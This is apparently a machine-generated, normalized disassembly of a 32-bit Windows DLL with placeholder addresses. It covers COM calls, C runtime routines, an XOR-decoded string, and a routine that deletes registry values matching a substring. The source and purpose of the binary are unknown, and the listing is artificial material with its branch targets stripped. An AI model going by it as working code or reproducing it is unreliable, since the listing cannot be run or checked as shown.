mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0x8c ]
push eax
push r--data
lea eax [ ebp - 0x24 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0x8c ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x83
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] ebx
call sub_1002f620
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x94 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0x78 ]
mov eax 0x5e
call sub_1002f620
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x94 ]
mov ecx [ eax ]
lea edx [ ebp - 0x90 ]
push edx
mov edx [ ebp - 0x8c ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x90 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x5a
call sub_1002f620
mov [ ebp - 0x98 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x8c ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0xa0
call sub_1002f620
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x90 ] ebx
jmp r-xdata
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0x98 ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x94 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_1001fb40
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_10052c10
mov [ esi + 0x4 ] 0x1
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f580
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_1001fbe0
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
xor esi esi
cmp [ eax ] esi
jbe r-xdata
pop esi
pop ebp
retn
lea ecx [ ecx ]
mov edx [ ebp + 0x14 ]
inc esi
cmp esi [ edx ]
jb r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x18 ]
push ecx
push edx
call [ StrStrW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0xc ]
push edi
push ecx
push 0x0
push 0x0
push ebx
mov [ ebx ] 0xff
push edx
mov [ edi ] 0x208
mov ecx [ eax ]
push esi
push ecx
call [ RegEnumValueW@IAT ]
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push eax
push edx
call [ RegDeleteValueW@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
sub_1001fc6d
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x20
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006b6ca
jmp r-xdata
sub_1001fcf4
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and ax [ ebp - 0x4 ]
or ax cx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1001fd20
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0x98 ] ebx
xor eax eax
lea ecx [ ecx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffac
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x98 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov ecx [ ebp - 0x98 ]
cmp ecx ebx
je r-xdata
pop edi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0x2
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa0 ]
mov [ ebp - 0xa0 ] ebx
call sub_10064930
test eax eax
je r-xdata
push esi
mov esi [ ebp - 0xa0 ]
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x7b
call sub_1002f620
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
mov [ ebp - 0x9c ] 0x3
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x44 ]
mov eax 0x111
call sub_1002f620
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
pop esi
push eax
mov [ ebp - 0x9c ] 0x4
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ebx [ esi ]
add edi 0x120
call sub_1004cc80
mov ebx [ esi + 0x4 ]
call sub_10023100
call sub_10013ee0
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
pop esi
push eax
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1001feb0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
nop
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_1001fef0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
cmp esi [ eax + 0x8 ]
je r-xdata
mov edx eax
pop edi
mov [ edx + 0x8 ] esi
pop esi
pop ebp
retn
mov eax r--data
test esi esi
jne r-xdata
push eax
push r--data
call sub_100386a0
mov ecx [ edi + 0x8 ]
add esp 0x8
pop edi
mov [ ecx + 0x8 ] esi
pop esi
pop ebp
retn
mov eax r--data
sub_1001ff32
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_1007f99d
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_1002d269
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_10020009
push 0xc
mov eax sub_100859f3
call sub_10026266
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x14 ] eax
je r-xdata
mov edi [ ebp + 0xc ]
and edi 0x8
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_1005d0f3
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x20
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_10053f25
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006b6ca
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_1001b4dd
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_10037e71
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_10012a59
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x8
call sub_1002e3ac
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10021806
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_1004aa10
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
jmp r-xdata
push 0x18
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_100405d8
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
push ebx
push ebx
call sub_10050657
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_1006db5a
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_100248e7
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_10010f30
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x10
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_100302d3
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x1c
call sub_1002e3ac
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1b
cmp ecx ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x11
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_10030066
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
call sub_10008d33
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_10040535
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x14
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
call sub_1001a709
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_1002f6be
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x16
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_100191d7
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_10066b6a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x17
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_10030066
mov [ esi ] r--data
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
sub_100205e6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_1002f3c9
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10020630
push ebp
mov ebp esp
push 0xffffffff
push sub_10086f08
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x0
call sub_10022420
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x10 ]
add esp 0x4
mov ebx eax
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x18 ]
push 0x20
mov ecx ebx
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x14 ]
not esi
call sub_10003c9c
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_100206d7
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_1003e294
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_10020700
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov eax [ ecx + 0x10 ]
push edi
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi eax
cmp esi edi
ja r-xdata
mov eax 0x1
sub eax esi
add edi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
movzx edx [ ebx ]
mov edi edi
mov [ ebp - 0x4 ] eax
mov ecx edi
test edi edi
je r-xdata
test eax eax
je r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx ebx
mov ecx eax
test esi esi
je r-xdata
cmp [ eax ] dx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov bx [ ecx ]
cmp bx [ edx ]
jne r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sbb edx edx
and edx 0xfffffffe
inc edx
je r-xdata
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
mov ecx eax
sub ecx [ ebp - 0x4 ]
or edx 0xffffffff
sar ecx 0x1
sub edx ecx
add edi edx
add eax 0x2
jmp r-xdata
sub_100207bd
push 0x8
push r--data
call sub_1007fad0
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_1007fb15
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_10020830
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov eax edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
sub_10020869
push 0x60
mov eax sub_100852e3
call sub_10047689
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
mov [ ebp - 0x68 ] ebx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x6c ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_10067ab7
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x64 ] eax
call sub_1002be90
mov ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10026407
push [ ebp - 0x60 ]
xor edi edi
inc edi
mov ecx esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x51 ] 0x0
call sub_1006995b
test al al
jne r-xdata
push edi
push ecx
push [ ebp - 0x60 ]
push esi
push ebx
push [ ebp + 0x8 ]
call sub_1001c00a
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_100262c3
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1001f91c
push [ ebp - 0x60 ]
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
push [ ebp - 0x60 ]
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] cl
jle r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1001f91c
inc ebx
mov ecx esi
mov [ ebp - 0x50 ] ebx
call sub_1005f5ef
cmp [ ebp - 0x58 ] 0x0
mov edi [ ebp - 0x60 ]
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x38 ] ecx
jne r-xdata
mov [ ebx ] 0x2d
push edi
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
mov bl [ esi + 0x5 ]
call [ eax + 0x4 ]
cmp bl al
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x52 ] al
mov [ ebp - 0x52 ] cl
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ebx [ ebp - 0x58 ]
push edi
mov ecx esi
call sub_1006995b
test al al
je r-xdata
call sub_1003d7d5
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005f5ef
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor ebx ebx
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10021130
push [ ebp - 0x60 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1006995b
test al al
jne r-xdata
